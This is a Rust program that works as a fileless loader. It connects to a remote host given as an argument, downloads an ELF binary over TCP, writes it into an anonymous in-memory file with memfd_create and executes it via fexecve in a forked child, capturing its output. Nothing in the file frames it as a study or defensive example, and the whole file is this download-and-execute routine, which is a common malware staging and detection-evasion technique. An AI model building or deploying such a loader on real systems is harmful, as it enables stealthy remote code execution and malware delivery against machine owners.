use std::{env, io::{Read, Write}, net::TcpStream, os::fd::FromRawFd};
use nix::libc;
use std::fs::File;


#[cfg(target_os = "linux")]
mod linux_memfd {
    use std::os::unix::io::FromRawFd;
    use std::ffi::{CString};
    use std::io::Write;
    use nix::libc;

    #[cfg(target_arch = "x86_64")]
    const SYS_MEMFD_CREATE: libc::c_long = 319;

    #[cfg(target_arch = "aarch64")]
    const SYS_MEMFD_CREATE: libc::c_long = 279;

    pub fn run_memfd_create(elf_bytes: &[u8]) {
        // Create memfd
        let fd = unsafe {
            libc::syscall(
                SYS_MEMFD_CREATE,
                CString::new("memexec").unwrap().as_ptr(),
                libc::MFD_CLOEXEC,
            ) as i32
        };
        if fd < 0 {
            panic!("memfd_create failed");
        }

        let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
        file.write_all(elf_bytes).expect("write failed");

        let argv = [CString::new("memexec").unwrap()];
        let argv_ptrs: Vec<_> = argv.iter().map(|s| s.as_ptr()).chain(Some(std::ptr::null())).collect();

        let envp_ptrs: [*const i8; 1] = [std::ptr::null()];

        // fexecve replaces the current process image
        let _ret = unsafe { libc::fexecve(fd, argv_ptrs.as_ptr(), envp_ptrs.as_ptr()) };
        panic!("fexecve failed: {}", std::io::Error::last_os_error());
    }
}


#[cfg(not(target_os = "linux"))]
mod linux_memfd {
    pub fn run_memfd_create(_elf_bytes: &[u8]) {
        eprintln!("memfd_create + fexecve is Linux-only and not supported on this OS");
        std::process::exit(1);
    }
}


fn main() {
    let remote_ip = {
        let args: Vec<String> = env::args().collect();
        if args.len() <= 1{
            panic!("Usage: \n\t {} ip:port", args[0]);
        }
        println!("remote ip {}", &args[1]);
        args[1].clone()
    };

    let mut stream = TcpStream::connect(remote_ip)
        .expect("Failed to connect remote server");
    
    stream.write("HELLO\n".as_bytes()).unwrap(); 
    stream.flush().unwrap();

    // Read exectuable file
    let mut buffer = Vec::new();
    
    let n = stream.read_to_end(&mut buffer).unwrap();
    let elf_bytes = &buffer[0..n];

    let (read_fd, write_fd) = {
        let mut fds = [0; 2];
        unsafe {
            if libc::pipe(fds.as_mut_ptr()) != 0 {
                panic!("pipe failed");
            }
        }
        (fds[0], fds[1])
    };

    let pid = unsafe { libc::fork() };
    if pid == 0 {
        // Child process
        unsafe {
            libc::dup2(write_fd, libc::STDOUT_FILENO);
            libc::close(read_fd);
        }
        linux_memfd::run_memfd_create(elf_bytes);
    } else {
        // Parent process
        unsafe { libc::close(write_fd);}

        let mut output = String::new();
        let mut reader = unsafe { File::from_raw_fd(read_fd) };
        reader.read_to_string(&mut output).unwrap();

        println!("Captured stdout from child:\n{}", output);
    }
}
